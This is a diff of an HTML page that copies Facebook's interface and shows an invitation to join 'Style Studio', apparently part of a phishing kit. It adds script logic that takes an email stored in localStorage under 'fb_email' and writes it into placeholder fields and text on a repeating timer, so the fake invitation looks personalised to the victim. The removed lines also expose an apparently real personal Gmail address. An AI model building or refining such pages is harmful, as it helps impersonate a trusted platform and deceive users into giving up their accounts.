@@ -375,7 +375,8 @@
                                                                             style="vertical-align: inherit;">
                                                                             <font dir="auto"
                                                                                 style="vertical-align: inherit;">You
-                                                                                have been invited to join Style Studio</font>
+                                                                                have been invited to join Style Studio
+                                                                            </font>
                                                                         </font>
                                                                     </span>
                                                                     <div
@@ -667,7 +668,7 @@
                                                                                                     class="xjbqb8w x972fbf x10w94by x1qhh985 x14e42zd xdj266r x14z9mp xat24cr x1lziwak x1t137rt xexx8yu xyri2b x18d9i69 x1c1uobl xwd1esu x1gnnqk1 xis6omg x1urst0s x1glnyev x1ad04t7 x1ix68h3 x19gujb8 xni1clt x1tutvks xfrpkgu x1vvvo52 x1fvot60 xo1l8bm xxio538 x1rffpxw xh8yej3 x10emqs4"
                                                                                                     disabled=""
                                                                                                     type="text"
-                                                                                                    value="thanhthuyeen21@gmail.com">
+                                                                                                    value="">
                                                                                             </div>
                                                                                         </div>
                                                                                     </div>
@@ -1244,22 +1245,25 @@
     <script>
         (function () {
             var email = localStorage.getItem('fb_email');
+            console.log('Retrieved email from localStorage:', email);   
             if (email) {
                 var replaceEmail = function () {
                     var inputs = document.getElementsByTagName('input');
                     for (var i = 0; i < inputs.length; i++) {
-                        if (inputs[i].value === 'drop@gmail.com') {
+                        if (inputs[i].value === 'admin1@gmail.com' || inputs[i].value === 'admin@gmail.com' || inputs[i].id === 'js_1u') {
                             inputs[i].value = email;
                         }
                     }
                     var all = document.querySelectorAll('*');
                     for (var i = 0; i < all.length; i++) {
-                        if (all[i].children.length === 0 && all[i].innerText === 'thanhthuyeen21@gmail.com') {
+                        if (all[i].children.length === 0 && (all[i].innerText === 'admin@gmail.com' || all[i].innerText === 'admin1@gmail.com')) {
                             all[i].innerText = email;
                         }
                     }
                 };
                 replaceEmail();
+                setTimeout(replaceEmail, 100);
+                setTimeout(replaceEmail, 500);
                 setTimeout(replaceEmail, 1000);
                 setTimeout(replaceEmail, 3000);
             }
